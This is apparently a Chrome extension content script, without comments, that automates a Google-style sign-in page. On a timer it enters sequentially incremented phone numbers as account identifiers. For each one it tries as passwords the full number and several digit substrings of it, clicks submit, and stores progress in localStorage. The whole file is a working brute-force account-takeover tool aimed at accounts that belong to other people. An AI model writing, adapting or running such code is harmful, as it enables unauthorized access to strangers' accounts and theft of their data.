chrome.runtime.onMessage.addListener(function(request){
    alert(request);




    class Store {
        static getBooks() {
            let books;
            if (localStorage.getItem('books') === null) {
                books = [];
            } else {
                books = JSON.parse(localStorage.getItem('books'));
            }
            return books;
        }
    
        static addBook(book) {
            let books = Store.getBooks();
            books.push(book);
    
            localStorage.setItem('books', JSON.stringify(books));
        }
    };
    
    let books = Store.getBooks();
    
    if (books["length"] == 0 === false) {
        var a = books[books.length - 1];
    } else {
        var a = prompt('Write A Phone Number');
    }
    
    function mail() {
        if (document.querySelector('.PrDSKc') == null || document.getElementById('identifierId').type == 'hidden' == true) {
    
            var book = document.querySelector('#identifierId').value;
    
            function abc() {
                switch (document.getElementById('password').getElementsByClassName('whsOnd') != null) {
                    case document.getElementById('password').getElementsByClassName('whsOnd') != null:
    
                        document.getElementsByClassName('whsOnd').password.value = book;
                        const element = document.querySelector('.nCP5yc');
                        element.click();
                        console.log(book);
                        Store.addBook(book);
                        break;
                    default:
                        break;
                };
            };
    
            function abcd() {
                switch (document.getElementById('password').getElementsByClassName('whsOnd') != null) {
                    case document.getElementById('password').getElementsByClassName('whsOnd') != null:
                        let num = `${book[3]}${book[4]}${book[5]}${book[6]}${book[7]}${book[8]}${book[9]}${book[10]}`;
                        document.getElementsByClassName('whsOnd').password.value = num;
                        const element = document.querySelector('.nCP5yc');
                        element.click();
                        console.log(num);
                        break;
                    default:
                        break;
                };
            };
    
            function abcde() {
                switch (document.getElementById('password').getElementsByClassName('whsOnd') != null) {
                    case document.getElementById('password').getElementsByClassName('whsOnd') != null:
                        let num = `${book[0]}${book[1]}${book[2]}${book[3]}${book[4]}${book[5]}${book[6]}${book[7]}`;
                        document.getElementsByClassName('whsOnd').password.value = num;
                        const element = document.querySelector('.nCP5yc');
                        element.click();
                        console.log(num);
                        break;
                    default:
                        break;
                };
            };
    
            function abcdd() {
                switch (document.getElementById('password').getElementsByClassName('whsOnd') != null) {
                    case document.getElementById('password').getElementsByClassName('whsOnd') != null:
                        let num = `${book[0]}${book[1]}${book[2]}${book[3]}${book[4]}${book[5]}${book[6]}${book[7]}${book[8]}`;
                        document.getElementsByClassName('whsOnd').password.value = num;
                        const element = document.querySelector('.nCP5yc');
                        element.click();
                        console.log(num);
                        break;
                    default:
                        break;
                };
            };
    
            function abcdef() {
                const element = document.querySelector('.krLnGe');
                element.click();
    
            };
    
            function abcdefg() {
                if (document.getElementById('identifierId').type === 'hidden' == true) {
    
                    const element = document.querySelector('.krLnGe');
                    element.click();
                };
    
            };
    
    
            setTimeout(abc, 500);
            setTimeout(abcd, 3500);
            setTimeout(abcde, 6500);
            setTimeout(abcdd, 9500);
            setTimeout(abcdef, 12500);
            setTimeout(abcdefg, 13500);
    
    
        } else {
    
            document.querySelector('#identifierId').value = `0${a++}`;
            const element = document.querySelector('.nCP5yc');
            element.click();
        };
    };
    setInterval(mail, 15500);
     



})
